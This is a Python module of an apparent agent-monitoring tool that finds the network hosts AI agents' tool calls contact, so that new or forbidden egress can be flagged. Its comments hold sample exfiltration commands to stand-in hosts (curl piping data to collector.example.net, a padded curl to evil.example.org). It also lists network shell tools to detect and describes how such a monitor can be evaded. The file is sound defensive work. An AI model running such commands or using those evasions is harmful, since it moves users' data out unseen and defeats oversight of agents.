# agent-certify — Structural verification of multiagent systems
# Copyright 2026 Cognitive Engineering (Switzerland)
# SPDX-License-Identifier: Apache-2.0
"""Network destinations: where an agent's tool calls point.

An agent graph says which tools ran. It does not say *where they went* — and
for anyone who has to answer where their data is processed, that is the
question. A single MCP server or HTTP tool pointed at a different host changes
the answer without changing the topology at all.

This module finds the destinations in a session's own logs and matches them
against the patterns an operator has accepted or rejected
(:mod:`agent_certify.baseline`), so
:class:`~agent_certify.anomaly.AnomalyDetector` can report a call to a host
that is new, or one that was forbidden.

What counts as a destination
----------------------------

Logs have no agreed field for this, so extraction is deliberately broad but
not indiscriminate:

* **Any full URL**, wherever it appears in a tool call's arguments:
  ``https://api.openai.com/v1/chat`` gives ``api.openai.com``. Schemes read:
  ``http``, ``https``, ``ws``, ``wss``, ``ftp``, ``ftps``.
* **A bare host**, but only as the value of a field that names one —
  ``url``, ``uri``, ``endpoint``, ``host``, ``domain``, ``base_url``,
  ``server``, ``origin``, ``proxy`` and their plurals (see
  :data:`NETWORK_KEYS`). ``{"host": "db.internal"}`` gives ``db.internal``.
* **Never a host in file content**, whatever the tool or the shape
  (:data:`CONTENT_KEYS`).
* **A host in a shell command line**, but only under a field that carries one
  (``command``, ``cmd``, ``script`` …, see :data:`SHELL_KEYS`) and only from
  the arguments of a known network client (:data:`NETWORK_COMMANDS`):
  ``{"command": "curl -sS collector.example.net/x"}`` gives
  ``collector.example.net``, while ``{"command": "grep alibaba.com notes"}``
  gives nothing. This closed the ``shell_domain`` blind spot the v0.7.0
  benchmark measured; :func:`domains_in_command` is the whole of it.

**Content is not a destination either.** The value of a field that carries file
or document content (:data:`CONTENT_KEYS`: ``content``, ``new_string``,
``text``, ``body`` …) is not read at all, whatever the tool: a session that
*writes* ``curl evil.example.net`` into a test file has contacted nobody, and
the ``Bash`` call that later runs that file is read as it always was.

A bare domain-looking word *anywhere* is not a destination. That distinction
is what keeps the feature usable: a session that reads a file mentioning
``example.com``, or greps for ``alibaba.com``, has contacted nobody, and
reporting it as egress would bury the real finding. For the same reason a tool
*result* is scanned only when that call's own arguments carried a URL — a
search result listing thirty hosts is content the agent read, not hosts it
called (see :func:`extract_call_domains`).

Hosts are stored as written, lowercased, without credentials, port or trailing
dot. Nothing is resolved: an IP literal in a URL is kept as the destination it
is, and a hostname is never turned into an address. A pattern is matched
against the name the agent used, which is the thing the operator decided
about.

Limits
------

Logs are untrusted input, so a walk is bounded: :data:`MAX_SHELL_SEGMENTS`
commands per command line, :data:`MAX_SCAN_DEPTH` levels,
:data:`MAX_SCAN_STRINGS` strings (a command line's arguments count against the
same budget, one each), :data:`MAX_STRING_CHARS` characters of any one string
and :data:`MAX_DOMAINS` hosts per call. A deeply nested or enormous argument
costs a bounded amount of work and is then left alone. Nothing here raises:
command lines are parsed with :mod:`shlex` and fall back to a whitespace split
when the quoting is broken, because a malformed command is exactly the shape an
exfiltration attempt would take.
"""
from __future__ import annotations

import json
import re
import shlex
from dataclasses import dataclass, field

#: Fields whose value is a destination even without a scheme.
NETWORK_KEYS = frozenset({
    "url", "urls", "uri", "uris", "endpoint", "endpoints", "host", "hosts", "hostname", "hostnames",
    "domain", "domains", "base_url", "baseurl", "base_uri", "server", "servers", "origin",
    "api_base", "api_url", "api_host", "proxy", "proxy_url", "webhook", "webhook_url", "address",
})

#: Fields that carry **file or document content**, which is written rather than
#: contacted. Nothing is read from them, under any tool.
#:
#: A session that writes a test fixture, a README or a code example containing
#: ``curl evil.example.net`` has reached nobody, and reporting it as egress
#: buries the finding that counts. Measured on real logs: of the 43 hosts
#: eleven held-out sessions stopped reading, 19 had only ever been *written*
#: into a file — the largest single source of false positives in the tool, and
#: most of them from sessions writing this module's own tests.
#:
#: This is the same distinction :func:`extract_call_domains` already made for a
#: tool's **result** (read only when the arguments pointed somewhere), applied
#: to the arguments of a tool that writes. It is scoped to the content keys, so
#: nothing else changes: a ``command`` is still a command (:data:`SHELL_KEYS`)
#: and a ``url`` is still a destination (:data:`NETWORK_KEYS`), so the ``Bash``
#: call that *runs* the file written above is read exactly as before.
CONTENT_KEYS = frozenset({
    "content", "contents", "new_string", "old_string", "file_text", "new_source", "old_source",
    "text", "body", "edits", "patch", "diff", "replacement",
})

MAX_SCAN_DEPTH = 32                  # nesting levels walked into one argument object
MAX_SCAN_STRINGS = 2000              # strings examined per call
MAX_STRING_CHARS = 10 * 1024 * 1024  # characters examined of any one string (the parsers' line limit)
MAX_DOMAINS = 200                    # hosts kept per call
MAX_HOST_CHARS = 512                 # characters of a bare-host value: a hostname is at most 253
MAX_SHLEX_CHARS = 64 * 1024          # characters of a command line parsed with full shell quoting
MAX_SHELL_SEGMENTS = 10_000          # commands read out of one command line

#: Why a scan stopped short of the whole argument object. Each one is counted
#: on the call and on the graph, and reported as a ``destination_scan_truncated``
#: anomaly: a bound that silently drops a destination is an evasion, so the
#: bound stays and the fact that it was reached is published.
TRUNCATED_DOMAINS = "domains"        # MAX_DOMAINS hosts already found
TRUNCATED_STRINGS = "strings"        # MAX_SCAN_STRINGS strings already examined
TRUNCATED_STRING = "string"          # one string longer than MAX_STRING_CHARS
TRUNCATED_DEPTH = "depth"            # nested deeper than MAX_SCAN_DEPTH
TRUNCATED_SEGMENTS = "segments"      # more commands on one line than MAX_SHELL_SEGMENTS
TRUNCATION_REASONS = (TRUNCATED_DOMAINS, TRUNCATED_STRINGS, TRUNCATED_STRING, TRUNCATED_DEPTH,
                      TRUNCATED_SEGMENTS)

#: A scheme, then either a bracketed IPv6 literal or a run of characters that a
#: hostname may hold. The backtick is excluded with the quotes: a host never
#: contains one, and a URL at the end of a markdown span is followed by one.
_URL = re.compile(r"(?:https?|wss?|ftps?)://"
                  r"(?P<host>\[[0-9A-Fa-f:.]{2,45}\]|[^\s/?#\\\"'`<>()\[\]{},;]+)",
                  re.IGNORECASE)
_IPV4 = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
_IPV6 = re.compile(r"^\[[0-9A-Fa-f:.]{2,45}\]$")
_HOST = re.compile(r"""
    ^(?=.{1,253}$)                      # a hostname is at most 253 characters
    (?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+   # one or more labels, each ending in alphanumeric
    [a-z]{2,63}$                        # a letters-only public suffix
""", re.IGNORECASE | re.VERBOSE)

#: Punctuation that prose and markdown put around a URL and a hostname never
#: holds. Stripped from both ends of an extracted authority, which is how
#: ``see https://api.example.com.`` and ``` `https://x.example.com` ``` used to
#: yield ``api.example.com.`` and ``x.example.com` ``. A URL's host can only
#: carry it at the end (the pattern starts after ``://``); a bare value under a
#: network-named key can carry it at either.
_TRAILING = "`\"'()[]{}<>,.;:!?*_"

#: The one single-label name that is a real destination. Everything else without
#: a dot is a word, a variable or a fragment: ``a``, ``api``, ``r``.
_LOCALHOST = "localhost"


@dataclass(slots=True)
class _Scan:
    """One call's scan: what it found, what it has cost, what a limit cut short.

    Threaded through the whole walk, so a bound reached deep inside a nested
    argument is visible to the caller instead of vanishing. ``strings`` is the
    budget :data:`MAX_SCAN_STRINGS` bounds, counting one per string examined and
    one per command-line argument read.
    """
    found: set[str] = field(default_factory=set)
    strings: int = 0
    data_bytes: int = 0                  # literal payload sizes named on a command line
    shlex_chars: int = 0                 # command-line characters parsed with full quoting
    truncated: set[str] = field(default_factory=set)

    def note(self, reason: str) -> None:
        self.truncated.add(reason)

    @property
    def spent(self) -> bool:
        """True when no further value can be read: the caller should stop and say why."""
        return len(self.found) >= MAX_DOMAINS or self.strings >= MAX_SCAN_STRINGS

    def add(self, host: str) -> bool:
        """Keep one host; False (and a note) when the per-call cap is already full."""
        if len(self.found) >= MAX_DOMAINS:
            self.note(TRUNCATED_DOMAINS)
            return False
        self.found.add(host)
        return True


def normalise_host(raw: str | None) -> str | None:
    """A URL's authority as a bare host: no credentials, no port, lowercase.

    ``"User:pw@API.OpenAI.com:443."`` becomes ``"api.openai.com"``. An IPv6
    literal keeps its brackets (``"[::1]"``), since that is what distinguishes
    it from a port. Returns None when nothing usable is left.
    """
    if not isinstance(raw, str):
        return None
    host = raw.strip().strip("\"'").split("@")[-1]           # drop any userinfo
    if host.startswith("["):                                  # IPv6 literal: [::1]:8080
        end = host.find("]")
        host = host[:end + 1] if end != -1 else host
    else:
        host = host.split(":")[0]                             # drop the port
        host = host.strip(_TRAILING)                          # markdown and prose, not a hostname
    host = host.rstrip(".").lower()
    return host or None


def host_shape(host: str | None) -> str | None:
    """``host`` when it is shaped like one, else None. One notion, used everywhere.

    A destination is a dotted name with a letters-only suffix
    (``api.openai.com``), an address literal (``1.2.3.4``, ``[::1]``), or
    ``localhost``. Anything else is a word that happened to follow ``://``:
    ``a``, ``api``, ``r``, ``h%d.example.net``, ``x`` with a backtick on it.
    Those are what a URL search used to hand over as destinations, because the
    shape test was applied to bare values only — one rule for a field that
    names a host and none at all for a URL.

    Nothing is resolved here either: the shape is the only thing checked.
    """
    if not host:
        return None
    if host.startswith("["):
        return host if _IPV6.match(host) else None
    if host == _LOCALHOST or _IPV4.match(host):
        return host
    return host if _HOST.match(host) else None


def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
    """Hosts of every full URL in ``text`` (no bare hostnames).

    The whole string is read, up to :data:`MAX_STRING_CHARS` — the same 10 MB
    the parsers already bound a record to. The URL pattern is a scheme followed
    by one character class, so it scans in linear time and a megabyte of
    padding costs a megabyte of scanning rather than hiding what follows it.
    Before this, a cut at 64 KB meant ``echo <70 000 characters>; curl
    evil.example.org`` reached nobody.
    """
    if not isinstance(text, str):
        return set()
    if len(text) > MAX_STRING_CHARS:
        text = text[:MAX_STRING_CHARS]
        if scan is not None:
            scan.note(TRUNCATED_STRING)
    if "://" not in text:
        # Every scheme the pattern reads is followed by "://", so a string
        # without it cannot hold a URL. The substring search is a fraction of
        # the cost of the regex, and most strings in a session are prose, a
        # path or a number: this is the difference between scanning a session's
        # arguments twice and scanning them once.
        return set()
    found = set()
    for m in _URL.finditer(text):
        host = host_shape(normalise_host(m.group("host")))
        if host:
            found.add(host)
    return found


#: Final labels that make a dotted word a filename rather than a host. A
#: network-named field is unlikely to hold one, but "notes.txt" and "data.csv"
#: are valid hostnames by shape, and reporting them as egress would be noise.
#:
#: **Every entry here has to be absent from the DNS root**, because a label
#: that is both a file extension and a delegated TLD makes this filter an
#: egress hole: ``{"host": "collector.zip"}`` would be silently dropped, and a
#: detector that stays quiet is worse than one that is noisy. Six labels were
#: removed for that reason — ``zip`` (a delegated gTLD with open
#: public registration), ``sh`` (Saint Helena), ``so`` (Somalia), ``md``
#: (Moldova), ``py`` (Paraguay) and ``rs`` (Serbia) — and the rest of the list
#: was checked against the root zone. Check any addition the same way: if
#: ``https://<label>`` could resolve for somebody, it does not belong here.
NOT_HOSTS = frozenset({
    "txt", "json", "jsonl", "csv", "tsv", "yml", "yaml", "toml", "ini", "cfg", "conf", "env",
    "log", "lock", "xml", "html", "htm", "css", "js", "jsx", "ts", "tsx", "pyc", "rb",
    "java", "bat", "ps1", "sql", "db", "sqlite", "png", "jpg", "jpeg", "gif", "svg",
    "pdf", "tar", "gz", "whl", "exe", "dll", "bak", "tmp", "cert", "pem", "key",
})


def host_in_value(value: str) -> str | None:
    """``value`` as a bare host, when it looks like one. For network-named fields only.

    An address literal counts: ``{"host": "1.2.3.4"}`` is as much a
    destination as a name, and a URL's authority already keeps one. Nothing is
    resolved in either direction — a name is never turned into an address.
    """
    host = host_shape(normalise_host(value))
    if not host:
        return None
    return None if host.rsplit(".", 1)[-1] in NOT_HOSTS else host


# ------------------------------------------------------- shell command lines
#: Fields whose value is a **command line**, read for the hosts its network
#: clients are pointed at. ``{"command": "curl -sS collector.example.net/x"}``
#: gives ``collector.example.net``.
#:
#: Shell commands are the most common exfiltration path in an agent session and
#: the one shape the bare-host rule above cannot see: ``curl`` takes its
#: destination as a positional argument, with no scheme, under a key that names
#: no host. So the value of these keys is parsed as a command line — and only
#: these keys. The parse stays as conservative as the rest of the module: a
#: host is read only from the arguments of a *known network client*
#: (:data:`NETWORK_COMMANDS`), so ``grep alibaba.com f``, ``echo example.com``
#: and ``git commit -m "see example.com"`` still give nothing.
SHELL_KEYS = frozenset({
    "command", "commands", "cmd", "cmds", "cmdline", "command_line", "commandline",
    "script", "scripts", "shell", "shell_command", "bash_command",
})

#: Programs whose arguments name a network destination. Matched on the program
#: name alone, without directory or ``.exe`` (``/usr/bin/curl`` -> ``curl``),
#: and case-insensitively, so the PowerShell cmdlets match however they are
#: spelled. Anything not on this list is ignored entirely: that is what keeps a
#: command which merely *mentions* a domain from reading as egress.
NETWORK_COMMANDS = frozenset({
    "curl", "wget", "http", "https", "httpie",           # http/https are the httpie entry points
    "nc", "ncat", "netcat", "socat", "telnet",
    "ssh", "scp", "sftp", "rsync", "ftp",
    "git",                                               # network subcommands only; see GIT_NETWORK_SUBCOMMANDS
    "invoke-webrequest", "invoke-restmethod", "iwr", "irm", "test-netconnection",
})

#: ``git`` subcommands that contact a remote. ``git commit -m "see example.com"``
#: and ``git grep http://x`` must give nothing, so the subcommand is checked
#: before any argument is read. ``git remote`` counts only as ``remote add``.
GIT_NETWORK_SUBCOMMANDS = frozenset({"clone", "fetch", "pull", "push", "ls-remote", "archive"})

#: PowerShell cmdlets, whose parameter names are case-insensitive (``-uri`` and
#: ``-Uri`` are the same switch). POSIX options are matched case-sensitively,
#: because ``-x`` and ``-X`` are different switches of the same program.
_PS_COMMANDS = frozenset({"invoke-webrequest", "invoke-restmethod", "iwr", "irm", "test-netconnection"})

#: Programs whose positional arguments are mostly *local paths*, so a bare
#: dotted word is a filename and not a host: only a value with ``:`` or ``@`` in
#: it, or a URL, is a destination. ``scp report.zip user@host.example.net:/b`` reaches
#: ``host.example.net`` and nothing else, and ``git clone repo.git`` reaches nobody.
_HOST_NEEDS_SEPARATOR = frozenset({"scp", "sftp", "rsync", "git"})

#: The HTTP clients, whose short options are scoped to them: ``-r`` is curl's
#: byte range and takes a value, while ``scp -r`` is a flag — and swallowing
#: the token after it would swallow the destination.
_HTTP_CLIENTS = frozenset({"curl", "wget", "http", "https", "httpie"})

#: The ssh family, which shares its option set.
_SSH_CLIENTS = frozenset({"ssh", "scp", "sftp"})

#: httpie, which takes its request body as ``key=value`` positional arguments.
_HTTPIE = frozenset({"http", "https", "httpie"})

#: Programs whose address arguments are colon-separated specifications
#: (``socat TCP4:collector.example.net:9000 -``), so every field is tried.
_COLON_SPECS = frozenset({"socat"})

#: Shells that run a command given as the value of an option
#: (``bash -c "curl collector.example.net/x"``). The value is re-read as a
#: command line of its own, one level deep (:data:`MAX_SHELL_DEPTH`), so a
#: wrapped client is read like a bare one. The wrapper itself is not a network
#: client: ``bash -c "echo example.com"`` still gives nothing, because the
#: *inner* program decides, exactly as the outer one does.
_SHELL_WRAPPERS = frozenset({"bash", "sh", "zsh", "dash", "ksh", "ash", "busybox",
                             "pwsh", "powershell", "cmd"})

#: The options those shells take a command in, matched case-insensitively
#: (``-Command``, ``/C``). POSIX shells also bundle short flags, so ``-lc`` and
#: ``-ic`` count as ``-c`` (see :data:`_BUNDLED_C`).
_SHELL_WRAPPER_OPTIONS = frozenset({"-c", "--command", "-command", "-com", "/c", "/k", "/r"})

#: A bundle of POSIX shell short flags ending in ``c``: ``bash -lc "<command>"``.
_BUNDLED_C = re.compile(r"^-[a-z]*c$")

#: How deep a command inside a command is read. One: a wrapped client is read,
#: and a client wrapped inside *that* is not. The limit is what keeps a hostile
#: log from costing unbounded work, and the budget bounds it besides.
MAX_SHELL_DEPTH = 1

#: Programs that take **one** destination and then a command to run there:
#: everything after the first positional argument of ``ssh host 'grep -o "[^
#: ]*" f'`` belongs to the remote shell, not to this one. Reading it as more
#: arguments of ``ssh`` found ``[^`` as a destination on real logs. It is
#: instead re-read as a command line in its own right, one level deep, so a
#: remote ``curl`` records both hosts: the one connected to, and the one the
#: remote command then reached.
_ONE_DESTINATION = frozenset({"ssh", "telnet"})


#: Leading words that wrap a command without being one. ``sudo``, ``env VAR=x``
#: and friends are skipped so the program underneath is the one judged.
_PREFIX_COMMANDS = frozenset({"sudo", "doas", "env", "time", "nohup", "command", "exec", "builtin", "stdbuf"})

#: Options of those wrappers that take a value, so ``sudo -u root curl x`` still
#: finds ``curl`` rather than stopping on ``root``.
_PREFIX_VALUE_OPTIONS = frozenset({"-u", "-g", "-U", "--user", "--group", "--unset", "-o", "-S", "-e"})

#: Option -> the programs it names a **destination** for (None: any of them).
#: Everything else an option takes is not a destination, which is the point of
#: listing these: ``curl -x proxy.example.net:3128 https://a.example`` reaches
#: both, while ``curl -o report.pdf https://a.example`` reaches only the one.
_DEST_OPTIONS = {
    "-x": None, "--proxy": None, "--preproxy": None,
    "--socks4": None, "--socks4a": None, "--socks5": None, "--socks5-hostname": None,
    "--resolve": None, "--connect-to": None, "--dns-servers": None,
    "-J": frozenset({"ssh", "scp", "sftp"}),             # ssh jump host
    "-uri": _PS_COMMANDS, "-proxy": _PS_COMMANDS, "-computername": _PS_COMMANDS,
}

#: Option -> the programs for which it takes a value that is **not** a
#: destination (None: any of them). An option that is in neither table is taken
#: for a flag, so the token after it is still read as a positional argument: a
#: missing entry can cost a false positive on an exotic option's value, never a
#: missed destination.
_VALUE_OPTIONS = {
    # curl, wget and httpie: data, headers, credentials, local files
    "--data": None, "--data-raw": None, "--data-binary": None, "--data-ascii": None,
    "--data-urlencode": None, "--json": None, "--header": None, "--form": None,
    "--form-string": None, "--user": None, "--request": None, "--user-agent": None,
    "--cookie": None, "--cookie-jar": None, "--referer": None, "--write-out": None,
    "--upload-file": None, "--config": None, "--cacert": None, "--capath": None,
    "--cert": None, "--key": None, "--max-time": None, "--connect-timeout": None,
    "--retry": None, "--limit-rate": None, "--output": None, "--range": None,
    "-o": _HTTP_CLIENTS | _SSH_CLIENTS | {"git"}, "-d": _HTTP_CLIENTS, "-H": _HTTP_CLIENTS, "-F": _HTTP_CLIENTS | _SSH_CLIENTS,
    "-u": _HTTP_CLIENTS, "-X": _HTTP_CLIENTS, "-A": _HTTP_CLIENTS, "-b": _HTTP_CLIENTS | {"ssh"},
    "-c": _HTTP_CLIENTS | {"ssh"}, "-e": _HTTP_CLIENTS | {"rsync"},
    "-w": _HTTP_CLIENTS | {"nc", "ncat", "netcat"},
    "-T": _HTTP_CLIENTS, "-K": _HTTP_CLIENTS, "-m": _HTTP_CLIENTS | {"ssh"}, "-r": _HTTP_CLIENTS,
    "-y": _HTTP_CLIENTS, "-Y": _HTTP_CLIENTS, "-z": _HTTP_CLIENTS,
    # wget
    "-O": frozenset({"wget"}), "--output-document": frozenset({"wget"}),
    "-P": frozenset({"wget"}), "--directory-prefix": frozenset({"wget"}),
    "--input-file": frozenset({"wget"}), "-a": frozenset({"wget"}),
    "--output-file": frozenset({"wget"}), "--post-data": frozenset({"wget"}),
    "--post-file": frozenset({"wget"}), "-t": frozenset({"wget"}),
    # ssh, scp, sftp: identity, port, login name, config, forwardings
    "-i": _SSH_CLIENTS | {"wget"}, "-p": _SSH_CLIENTS | {"nc", "ncat", "netcat"},
    "-l": frozenset({"ssh", "nc", "ncat", "netcat"}), "-S": _SSH_CLIENTS,
    "-L": frozenset({"ssh"}), "-R": frozenset({"ssh"}), "-D": frozenset({"ssh"}),
    "-W": frozenset({"ssh"}), "-E": frozenset({"ssh"}), "-I": _SSH_CLIENTS, "-B": _SSH_CLIENTS,
    # the netcat family
    "-s": frozenset({"nc", "ncat", "netcat"}), "-q": frozenset({"nc", "ncat", "netcat"}),
    "-G": frozenset({"ncat"}),
    # rsync
    "--rsh": frozenset({"rsync"}), "--exclude": frozenset({"rsync"}),
    "--include": frozenset({"rsync"}), "--files-from": frozenset({"rsync"}),
    "--log-file": frozenset({"rsync"}), "--temp-dir": frozenset({"rsync"}),
    "--bwlimit": frozenset({"rsync"}),
    # git
    "-C": frozenset({"git"}), "--git-dir": frozenset({"git"}), "--work-tree": frozenset({"git"}),
    "--depth": frozenset({"git"}), "--origin": frozenset({"git"}), "--branch": frozenset({"git"}),
    "--reference": frozenset({"git"}), "--template": frozenset({"git"}),
    "--upload-pack": frozenset({"git"}), "--receive-pack": frozenset({"git"}),
    # PowerShell parameters whose value is a body, a header set or a local file
    "-method": _PS_COMMANDS, "-body": _PS_COMMANDS, "-headers": _PS_COMMANDS,
    "-outfile": _PS_COMMANDS, "-infile": _PS_COMMANDS, "-contenttype": _PS_COMMANDS,
    "-useragent": _PS_COMMANDS, "-port": _PS_COMMANDS, "-informationlevel": _PS_COMMANDS,
    "-timeoutsec": _PS_COMMANDS, "-sessionvariable": _PS_COMMANDS, "-websession": _PS_COMMANDS,
}

#: Segment separators, the two-character operators first so ``||`` and ``&&``
#: are not split into empty segments. Used on a line whose quoting does not
#: balance; :func:`_split_segments` is the quote-aware version.
_SEGMENTS = re.compile(r"\|\||&&|[|;&\n\r]")

#: One pass over a command line, matching either a **quoted span** or a
#: **separator**. Scanning for both at once is what makes quote-aware splitting
#: as cheap as the plain split: the regex engine does the character work and
#: only the few matches are handled in Python.
#:
#: A single-quoted span holds no escapes (POSIX); a double-quoted one honours
#: ``\"``. A separator inside either is part of an argument, not a separator:
#: ``git commit -m "fix; curl api.example.net"`` runs one command, and reading
#: the fragment after the semicolon as a second one made a *mention* of a curl
#: look like an invocation. That was the last large source of false positives
#: measured on real logs.
#: A quoted span never crosses a line here (see :func:`_split_segments`), so
#: neither pattern may match a newline: no ``re.DOTALL``, and the classes
#: exclude the line breaks.
_QUOTED_OR_SEPARATOR = re.compile(r"""
      '[^'\n\r]*'                     # a single-quoted span: no escapes inside it
    | "(?:\\[^\n\r]|[^"\\\n\r])*"      # a double-quoted span, with \" escapes
    | \|\| | &&                      # the two-character operators
    | [|;&]                          # and the one-character ones
""", re.VERBOSE)

#: Line breaks separate commands unconditionally, and are taken out first: a
#: quote is balanced or not *within one line*, so a stray apostrophe cannot
#: change how the lines around it are read.
_LINES = re.compile(r"[\n\r]")

_QUOTES = ("'", '"')

#: Is there anything to split on at all? A command line with no separator is
#: one segment, and most are: this is the cheap way to say so before any of the
#: work below.
_HAS_SEPARATOR = re.compile(r"[|;&\n\r]")

#: A leading ``VAR=value``, which is an assignment and not the program.
_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

#: Options are matched as a whole token; ``-``, ``--`` and ``-`` alone are not.
_OPTION = re.compile(r"^-{1,2}[^\s-]")


def _program_name(token: str) -> str:
    """A program token as a bare name: no directory, no ``.exe``, lowercased."""
    name = token.strip().strip("\"'").replace("\\", "/").rsplit("/", 1)[-1]
    if name.lower().endswith(".exe"):
        name = name[:-4]
    return name.lower()


def _option_kind(option: str, program: str) -> str | None:
    """``"dest"``, ``"value"`` or None (a flag), for ``option`` under ``program``."""
    spellings = (option, option.lower()) if program in _PS_COMMANDS else (option,)
    for table, kind in ((_DEST_OPTIONS, "dest"), (_VALUE_OPTIONS, "value")):
        for spelling in spellings:
            programs = table.get(spelling, False)
            if programs is not False and (programs is None or program in programs):
                return kind
    return None


def _destinations_in_arg(value: str, program: str, colon_fields: bool = False) -> set[str]:
    """Hosts named by one argument of a network client.

    Reads the shapes a client takes a destination in: a URL, ``host``,
    ``host:port``, ``host/path``, ``user@host`` and ``user@host:path``. Nothing
    else — a value with no host in it gives nothing rather than a guess.
    """
    found = domains_in_text(value)
    if found:
        return found                                     # a full URL: the rest is path and query
    text = value.strip().strip("\"'")
    if program in _HOST_NEEDS_SEPARATOR and not ("@" in text or ":" in text):
        return found                                     # a bare word here is a local path (scp, git)
    host = _bare_host(text)
    if host:
        found.add(host)
    if colon_fields:                                     # --resolve host:port:addr, socat TCP4:host:port
        for field in text.split(":"):
            host = _bare_host(field)
            if host:
                found.add(host)
    return found


def _bare_host(text: str) -> str | None:
    """``text`` up to its path as a host; :func:`host_shape` holds the brackets to IPv6."""
    return host_in_value(re.split(r"[/?#]", text, maxsplit=1)[0])


def _strip_prefixes(tokens: list[str]) -> list[str]:
    """``tokens`` without the wrappers and assignments in front of the program."""
    i = 0
    while i < len(tokens):
        if _program_name(tokens[i]) in _PREFIX_COMMANDS:
            i += 1
            while i < len(tokens) and _OPTION.match(tokens[i]):
                option = tokens[i]
                i += 1
                if "=" not in option and option in _PREFIX_VALUE_OPTIONS and i < len(tokens):
                    i += 1
            continue
        if _ASSIGNMENT.match(tokens[i]):                 # VAR=value at the head of the segment
            i += 1
            continue
        break
    return tokens[i:]


def _git_arguments(args: list[str]) -> list[str] | None:
    """``args`` after a network subcommand, or None when this ``git`` contacted nothing.

    ``git clone <url>`` and ``git remote add <name> <url>`` reach a remote;
    ``git commit``, ``git grep`` and ``git log`` do not, and must not have their
    arguments read at all.
    """
    i = 0
    while i < len(args):
        token = args[i]
        i += 1
        if _OPTION.match(token):
            if "=" not in token and _option_kind(token, "git") == "value" and i < len(args):
                i += 1
            continue
        subcommand = token.lower()
        if subcommand == "remote":
            following = next((a for a in args[i:] if not _OPTION.match(a)), "")
            return args[i:] if following.lower() == "add" else None
        return args[i:] if subcommand in GIT_NETWORK_SUBCOMMANDS else None
    return None


def _wrapped_command(args: list[str]) -> str | None:
    """The command a shell wrapper was given, or None when it was given none.

    ``["-lc", "curl x"]`` gives ``"curl x"``. shlex has already removed the
    quotes around it, so what comes back is a command line to read again.

    Everything after the option is joined, because ``cmd /C curl host.example.net/x``
    passes the command unquoted as several tokens while ``bash -c "curl x"``
    passes it as one. Joining reads both; the extra words a POSIX shell takes
    after its command (``$0`` and positional parameters) can only ever add a
    token that is not a host.
    """
    i = 0
    while i < len(args):
        token = args[i]
        i += 1
        option, sep, inline = token.partition("=")
        if option.lower() in _SHELL_WRAPPER_OPTIONS or _BUNDLED_C.match(option):
            return inline if sep else " ".join(args[i:]) or None
    return None


def _hosts_in_segment(tokens: list[str], scan: _Scan, depth: int) -> None:
    """Add the destinations of one command segment to ``scan``, with its payload sizes."""
    tokens = _strip_prefixes(tokens)
    if not tokens:
        return
    program = _program_name(tokens[0])
    if program in _SHELL_WRAPPERS:
        # A shell running a command: read that command, not this one. The
        # wrapper names no destination of its own.
        inner = _wrapped_command(tokens[1:])
        if inner and depth < MAX_SHELL_DEPTH:
            _scan_command(inner, scan, depth + 1)
        return
    if program not in NETWORK_COMMANDS:
        return                                           # not a network client: its arguments say nothing
    args = tokens[1:]
    if program == "git":
        args = _git_arguments(args)
        if args is None:
            return
    i = 0
    while i < len(args):
        if scan.spent:
            scan.note(TRUNCATED_DOMAINS if len(scan.found) >= MAX_DOMAINS else TRUNCATED_STRINGS)
            return
        token = args[i]
        i += 1
        scan.strings += 1
        hosts: set[str] = set()
        if _OPTION.match(token):
            option, sep, inline = token.partition("=")
            kind = _option_kind(option, program)
            is_data = option in DATA_OPTIONS
            if kind is None and not is_data:
                continue                                 # a flag: nothing of it is a destination
            value = inline if sep else (args[i] if i < len(args) else "")
            if not sep and i < len(args):
                i += 1                                   # the option consumed it, destination or not
            if is_data:
                scan.data_bytes += _literal_data_bytes(option, value)
            if kind == "dest":
                hosts = _destinations_in_arg(value, program, colon_fields=True)
        else:
            if program in _HTTPIE and "=" in token:
                # httpie takes its body as key=value pairs: "name=x" is data.
                scan.data_bytes += _literal_data_bytes("", token)
            hosts = _destinations_in_arg(token, program, colon_fields=program in _COLON_SPECS)
            if program in _ONE_DESTINATION:
                remote, i = " ".join(args[i:]), len(args)  # the rest is a command for that host to run
                if remote and depth < MAX_SHELL_DEPTH:
                    _scan_command(remote, scan, depth + 1)
        for host in sorted(hosts):
            if not scan.add(host):
                return


def domains_in_command(command: str, budget: list[int] | None = None) -> set[str]:
    """Hosts a shell command line points a known network client at.

    ``"cat x | curl -d @- collector.example.net"`` gives
    ``collector.example.net``; ``"grep alibaba.com notes"`` gives nothing. The
    line is split into segments on ``|``, ``||``, ``&&``, ``;``, ``&`` and
    newlines **outside quotes**; each segment is tokenised with :mod:`shlex`;
    the wrappers
    (``sudo``, ``env VAR=x``, ``time``, ``nohup``, ``command``, ``exec``) and
    leading assignments are dropped; and the program that is left decides
    whether any argument is read at all.

    A command *inside* a command is read one level deep
    (:data:`MAX_SHELL_DEPTH`): the value of ``bash -c`` and friends
    (:data:`_SHELL_WRAPPERS`), and the remote command of ``ssh host <command>``.
    The inner program is judged by exactly the same rule as the outer one, so
    ``bash -c "echo example.com"`` still gives nothing.

    Never raises. An unclosed quote makes :mod:`shlex` fail, and the segment is
    then split on whitespace instead: a malformed command line is exactly the
    shape an exfiltration attempt would take, so it must not be the shape that
    gets extraction to give up.

    ``budget`` is the shared string budget of :func:`extract_domains`; each
    argument examined costs one, so a pathological command line is bounded by
    :data:`MAX_SCAN_STRINGS` like everything else.
    """
    if not isinstance(command, str) or not command.strip():
        return set()
    scan = _Scan(strings=budget[0] if budget else 0)
    _scan_command(command, scan, 0)
    if budget is not None:
        budget[0] = scan.strings
    return scan.found


def _split_segments(command: str) -> list[str]:
    """``command`` cut into the commands it runs, ignoring separators inside quotes.

    ``curl a.example.net; curl b.example.net`` is two commands;
    ``echo "a; wget b.example.net"`` is one, and nothing in it is a wget.

    **Line by line.** A line break always separates commands, so the quoting of
    one line cannot change how another is read. That matters on a log: a tool
    call carrying a heredoc or a script holds dozens of lines, each with its own
    quotes, and pairing a quote on one line with a quote twenty lines later
    would move every segment boundary in between. Measured on real logs, doing
    it globally found *more* spurious hosts than the plain split, not fewer.

    One exact fast path comes first, because this runs on every command line of
    every session: a line with no separator at all is one segment, whatever its
    quoting.

    **Unbalanced quoting falls back to the plain split** for that line, which is
    what this did for every line before: a quote that never closes means the
    structure cannot be trusted, and a malformed command line is exactly the
    shape an exfiltration attempt would take, so the conservative reading (more
    segments, more destinations) is the one to keep. An apostrophe in prose
    lands here too, and that is the right side to err on.

